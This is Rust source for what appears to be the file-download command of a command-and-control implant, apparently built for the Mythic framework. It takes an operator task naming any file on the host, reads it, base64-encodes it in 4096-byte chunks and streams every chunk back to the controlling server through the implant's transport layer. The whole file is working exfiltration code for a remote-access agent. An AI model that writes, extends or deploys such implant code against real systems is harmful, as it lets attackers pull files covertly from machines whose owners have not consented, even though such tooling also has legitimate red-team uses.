use serde::Deserialize;
use serde_json::Value;
use std::{
    fs::{File, metadata},
    io::Read,
    path::PathBuf,
};
use base64::engine::general_purpose;
use base64::Engine;

const CHUNK_SIZE: usize = 4096;

#[derive(Deserialize)]
struct DownloadParams {
    file: String,
}

pub fn download(task: &Value) -> Result<(), Box<dyn std::error::Error>> {
    // 1. Pull out task ID + parameters
    let id = task.get("id")
        .and_then(Value::as_str)
        .ok_or("Missing `id`")?;
    let raw = task.get("parameters")
        .and_then(Value::as_str)
        .ok_or("Missing `parameters`")?;
    let params: DownloadParams = serde_json::from_str(raw)?;

    // 2. Resolve path
    let mut path = PathBuf::from(&params.file);
    if !path.is_absolute() {
        path = std::env::current_dir()?.join(&params.file);
    }

    // 3. Stat file and compute total_chunks
    let size = metadata(&path)?.len() as usize;
    let total_chunks = size / CHUNK_SIZE + (size % CHUNK_SIZE > 0) as usize;

    // 4. Send initial RPC to get back agent_file_id
    let init = serde_json::json!({
        "action": "post_response",
        "responses": [{
            "task_id": id,
            "download": {
                "total_chunks": total_chunks,
                "full_path": path.to_string_lossy(),
                "chunk_size": CHUNK_SIZE
            }
        }]
    })
    .to_string();
    let init_resp: Value = crate::transport::send_request_with_response(&init)?;
    let file_id = init_resp["responses"][0]["file_id"]
        .as_str()
        .ok_or("Missing file_id in initial response")?;

    // 5. Stream the file back in chunks
    let mut f = File::open(&path)?;
    let mut buffer = vec![0u8; CHUNK_SIZE];
    let mut chunk_num = 1;
    while let Ok(n) = f.read(&mut buffer) {
        if n == 0 { break; }
        let chunk_data = general_purpose::STANDARD.encode(&buffer[..n]);
        let payload = serde_json::json!({
            "action": "post_response",
            "responses": [{
                "task_id": id,
                "download": {
                    "chunk_num": chunk_num,
                    "file_id": file_id,
                    "chunk_data": chunk_data
                }
            }]
        })
        .to_string();
        crate::transport::send_request(&payload)?;
        chunk_num += 1;
    }

    // 6. Final success response with the new agent file ID
    let done = serde_json::json!({
        "action": "post_response",
        "responses": [{
            "task_id": id,
            "user_output": format!("Uploaded as {}", file_id),
            "agent_file_id": file_id,
            "status": "success"
        }]
    })
    .to_string();
    crate::transport::send_request(&done)?;

    Ok(())
}
